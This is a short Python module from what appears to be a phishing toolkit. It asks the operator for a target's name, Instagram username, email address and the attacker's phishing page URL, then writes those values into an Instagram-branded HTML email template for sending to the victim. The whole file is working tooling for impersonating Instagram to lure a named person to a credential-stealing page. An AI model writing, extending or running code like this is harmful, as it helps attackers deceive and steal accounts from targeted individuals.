from Modules.UI import *

def pageParser():
    clear()
    banner()
    clear()
    banner()
    print(style.YELLOW('--Fill the folowing credentials for Instagram phishing email--'))
    print(style.GREEN('\n[+]') + style.RESET("Enter the target name that will be displayed on the email:"))
    pageParser.targetName  = str(input(style.CYAN(">>> ") + style.RESET('')))
    print(style.GREEN('\n[+]') + style.RESET("Enter the target's Instagram username:"))
    pageParser.targetUsername  = str(input(style.CYAN(">>> ") + style.RESET('')))
    print(style.GREEN('\n[+]') + style.RESET('Enter the target email:'))
    pageParser.targetEmail = str(input(style.CYAN(">>> ") + style.RESET('')))
    print(style.GREEN('\n[+]') + style.RESET("Enter you'r phishing page URL:"))
    pageParser.redirectURL = str(input(style.CYAN(">>> ") + style.RESET('')))


def pageGenerator_IG():
    pageParser()
    fin = open("Templates/Instagram.html", "rt")
    fout = open("Templates/TempTemplates/InstagramTemplate.html", "wt")
    for line in fin:
        fout.write(line.replace('#NAME', pageParser.targetName).replace('#USERNAME', pageParser.targetUsername).replace('#EMAIL', pageParser.targetEmail).replace('#URL', pageParser.redirectURL))
    fin.close()
    fout.close()
